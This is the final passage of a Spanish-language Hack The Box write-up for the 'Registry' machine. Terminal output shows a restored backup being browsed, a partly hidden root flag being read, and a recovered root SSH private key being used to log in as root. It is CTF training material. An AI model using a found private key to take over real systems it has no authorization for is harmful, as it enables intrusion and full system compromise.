┌─[192.168.1.52]─[pointedsec@parrot]─[/tmp/rest-server-0.9.3/restore/root]
└──╼ [★]$ ls
config.yml  cron.sh  root.txt
┌─[192.168.1.52]─[pointedsec@parrot]─[/tmp/rest-server-0.9.3/restore/root]
└──╼ [★]$ cat root.txt 
dd62564f2d232d29...
```

También vemos la clave privada de `root`

```console
┌─[192.168.1.52]─[pointedsec@parrot]─[/tmp/rest-server-0.9.3/restore/root/.ssh]
└──╼ [★]$ ls
authorized_keys  id_rsa  id_rsa.pub
```

Y podríamos conseguir una consola interactiva en la máquina víctima.
```console
$ ssh -i id_rsa root@registry.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Wed Aug 28 21:29:14 UTC 2024

  System load:                    0.0
  Usage of /:                     60.2% of 4.71GB
  Memory usage:                   18%
  Swap usage:                     0%
  Processes:                      190
  Users logged in:                1
  IP address for eth0:            10.129.220.101
  IP address for br-1bad9bd75d17: 172.18.0.1
  IP address for docker0:         172.17.0.1
Last login: Wed Sep  7 15:10:00 2022
root@registry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@registry:~# 
```

¡Y ya estaría!

Happy Hacking! 🚀